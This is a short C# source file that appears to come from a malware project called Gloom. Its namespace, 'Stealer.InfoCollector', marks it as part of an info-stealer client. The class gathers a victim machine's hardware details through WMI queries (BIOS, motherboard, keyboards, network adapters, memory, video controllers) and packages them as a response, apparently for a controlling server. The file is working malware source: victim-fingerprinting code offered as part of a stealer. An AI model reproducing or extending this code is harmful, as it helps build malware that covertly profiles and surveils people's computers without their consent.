using Gloom.WmiOps;

namespace Gloom.Client.Features.Stealer.InfoCollector.Wmi;
internal class WmiHardwareInfo : WmiInfo
{
	public WmiHardwareInfo() : base(WmiOpCodes.HardwareInfo)
	{
	}

	public override object Collect()
	{
		return new HardwareInfoResponse
		{
			Bios = Crawl<Win32Bios>("Win32_Bios")[0],
			BaseBoard = Crawl<Win32BaseBoard>("Win32_BaseBoard")[0],
			Keyboards = Crawl<Win32Keyboard>("Win32_Keyboard"),
			NetworkAdapters = Crawl<Win32NetworkAdapter>("Win32_NetworkAdapter"),
			PhysicalMemories = Crawl<Win32PhysicalMemory>("Win32_PhysicalMemory"),
			PointingDevices = Crawl<Win32PointingDevice>("Win32_PointingDevice"),
			VideoControllers = Crawl<Win32VideoController>("Win32_VideoController")
		};
	}
}
